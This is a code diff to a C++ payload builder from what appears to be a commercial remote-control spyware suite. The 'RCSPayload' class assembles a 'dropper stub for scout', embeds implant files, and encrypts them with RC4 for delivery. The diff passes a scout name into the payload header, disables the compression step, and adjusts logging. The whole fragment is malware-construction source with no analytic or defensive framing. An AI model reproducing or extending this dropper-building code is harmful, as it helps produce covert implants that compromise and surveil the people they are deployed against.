@@ -18,7 +18,7 @@ extern std::string productVersion;
 
 #define OFFSET(x) do { *((DWORD*) x) = offset_(x); x += sizeof(DWORD); } while(0)
 
-RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout )
+RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout, char *scout_name )
 : rcs_(rcs), components_(components), cookedSize_(0)
 {
 	if (!bScout)
@@ -143,11 +143,13 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout )
 	}
 	else // scout
 	{
-		cout << "Building dropper stub for scout" << endl;
+		
 		unsigned int buffer_size = 
 			alignToDWORD( sizeof(DataSectionHeader) )
 			+ rcs_.core_size()
 			+ 69535; // account for strings, etc.
+
+		cout << "Building dropper stub for scout, size: " << rcs_.core_size() << endl;
 
 		cooked_.reset( new char[buffer_size] );
 		char* ptr = cooked_.get();
@@ -170,6 +172,9 @@ RCSPayload::RCSPayload( RCSConfig& rcs, Components& components, BOOL bScout )
 
 		// HEADER -> cooker version
 		memcpy(header->version, productVersion.c_str(), productVersion.length() + 1);
+
+		// HEADER -> scout name
+		memcpy(header->eliteExports, scout_name, strlen(scout_name)+1);
 
 		OFFSET(ptr);
 		END_MARKER(ptr);
@@ -266,7 +271,7 @@ std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, 
 	// TODO move to auto pointers
 
 	std::size_t size = (DWORD) bf::file_size(path);
-	cout << __FUNCTION__ << " file size: " << size << endl;
+	cout << __FUNCTION__ << " file size: " << size << " for " << path << endl;
 	if (size == 0)
 		return 0;
 	
@@ -289,10 +294,12 @@ std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, 
 	fs.open(path, ios::in | ios::binary);
 	
 	// read file
+
 	char* buf = new char[size];
+
 	fs.read(buf, size);
 	std::size_t n = fs.gcount();
-	
+	/*
 	// compress data
 	char* packed = new char[aP_max_packed_size(size)];
 	char *workmem = new char[aP_workmem_size(size)];
@@ -303,25 +310,29 @@ std::size_t RCSPayload::embedFile_(const bf::path& path, DataSectionBlob& name, 
 		printf("Error compressing!\n");
 		return 0;
 	}
-
+	*/
+	char *packed = buf;
+	int packed_size = size;
 	rc4_encrypt((unsigned char*)key, RC4KEYLEN, 0, (unsigned char *)packed, packed_size);
     
-	delete [] buf;
+	//delete [] buf;
 	
 	// save compressed size
 	file.size = packed_size;
 	
-	if (workmem) {
-		delete [] workmem;
-		workmem = NULL;
-	}
+//	if (workmem) {
+//		delete [] workmem;
+//		workmem = NULL;
+//	}
 	
 	// encrypt
 
 	// write compressed to buffer
 	memcpy(p, packed, packed_size);
+
 	p += packed_size;
 
+	
 	delete [] packed;
 	
 	std::size_t ret = ((DWORD)p - (DWORD)ptr);
